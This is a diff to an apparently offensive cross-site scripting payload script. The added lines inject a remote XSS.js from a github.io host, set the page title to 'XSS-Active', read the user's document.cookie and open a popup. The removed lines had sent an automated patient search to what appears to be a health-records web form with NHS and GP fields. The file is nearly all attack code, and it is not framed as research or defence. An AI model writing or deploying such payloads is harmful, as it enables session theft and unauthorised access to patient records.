@@ -1,7 +1,6 @@
+<script src="https://jdl-84.github.io/CACHE-XSS/XSS.js"></script> 
 //BEGIN - Update Title for confirmation script loaded
-
-document.title = "JDL-xss"
-
+document.title = "XSS-Active"
 //Put Back the variable used to invoke the XSS
 //Script damaged!
 var websession  = '1';
@@ -11,10 +10,18 @@ var TimeAsMS        = CurrDT.getTime();
 var LastRefresh = TimeAsMS;
 var timeoutlength = 9999000;
 
+//Get Cookie
+var UsersCookie = document.cookie;
 
-async () => {
- const xhr = new XMLHttpRequest();
- xhr.open("POST", "/nimstrain/webform.csp?screen=webpscps.csp", true);
- xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
- xhr.send("webPSnhs=&webPSotherid=&webPSsurname=smith&webPSforename=&webPSmidname=&webPSdob=&webPSsex=&webSubmitBTN=%A0%A0%A0%A0Find%A0%A0%A0%A0&webPSsurnameincother=1&webPSaddress=&webPSpcode=&webPSgp=&webPSorg=1&displaydeswebPSorg=Top+Level&webPSorderby=webPRnamstr&Update=1&Submit=submitFind&webPSsearchtitle=&webPSresultstitle=&webSTORE=&webPSidall=&websession=1");
+
+function createPopup(){
+var popup = open("", "Popup", "width=300,height=200");
+var txtOk = popup.document.createElement("TEXTAREA");
+var aOk = popup.document.createElement("a");
+aOk.innerHTML = "Click here";
+
+popup.document.body.appendChild(txtOk);
+popup.document.body.appendChild(aOk);
 }
+
+createPopup();
